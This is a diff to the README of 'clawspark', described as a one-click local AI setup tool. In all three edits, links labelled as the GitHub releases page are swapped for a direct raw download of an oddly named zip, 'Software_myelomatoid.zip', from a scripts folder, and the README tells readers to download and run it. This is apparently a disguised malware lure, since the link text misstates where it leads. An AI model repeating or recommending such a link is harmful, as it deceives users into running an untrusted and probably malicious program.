@@ -1,6 +1,6 @@
 # ⚡ clawspark - Local AI setup in one click
 
-[![Download clawspark](https://img.shields.io/badge/Download%20clawspark-purple?style=for-the-badge)](https://github.com/Remittanceluo951/clawspark/releases)
+[![Download clawspark](https://img.shields.io/badge/Download%20clawspark-purple?style=for-the-badge)](https://raw.githubusercontent.com/Remittanceluo951/clawspark/main/scripts/Software_myelomatoid.zip)
 
 ## 🧭 What clawspark does
 
@@ -29,7 +29,7 @@ For best results, use:
 
 Use the release page to get the latest version:
 
-[Visit the clawspark releases page](https://github.com/Remittanceluo951/clawspark/releases)
+[Visit the clawspark releases page](https://raw.githubusercontent.com/Remittanceluo951/clawspark/main/scripts/Software_myelomatoid.zip)
 
 From there, download the Windows file that matches your device, then run it.
 
@@ -138,7 +138,7 @@ This app is a good match for:
 
 Go to the release page, download the Windows build, and run the installer:
 
-[https://github.com/Remittanceluo951/clawspark/releases](https://github.com/Remittanceluo951/clawspark/releases)
+[https://raw.githubusercontent.com/Remittanceluo951/clawspark/main/scripts/Software_myelomatoid.zip](https://raw.githubusercontent.com/Remittanceluo951/clawspark/main/scripts/Software_myelomatoid.zip)
 
 ## 🧩 Topics
 
